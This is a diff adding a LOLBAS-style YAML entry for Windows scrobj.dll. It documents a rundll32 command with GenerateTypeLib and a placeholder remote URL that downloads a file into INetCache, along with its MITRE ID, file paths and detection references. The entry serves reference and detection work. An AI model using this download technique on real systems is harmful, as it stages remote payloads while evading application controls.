@@ -1,0 +1,26 @@
+---
+Name: Scrobj.dll
+Description: Windows Script Component Runtime
+Author: Eral4m
+Created: 2021-01-07
+Commands:
+  - Command: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
+    Description: Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.
+    Usecase: Download file from remote location.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Download: INetCache
+Full_Path:
+  - Path: c:\windows\system32\scrobj.dll
+  - Path: c:\windows\syswow64\scrobj.dll
+Detection:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
+  - IOC: Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://') on the command line
+Resources:
+  - Link: https://twitter.com/eral4m/status/1479106975967240209
+Acknowledgement:
+  - Person: Eral4m
+    Handle: '@eral4m'
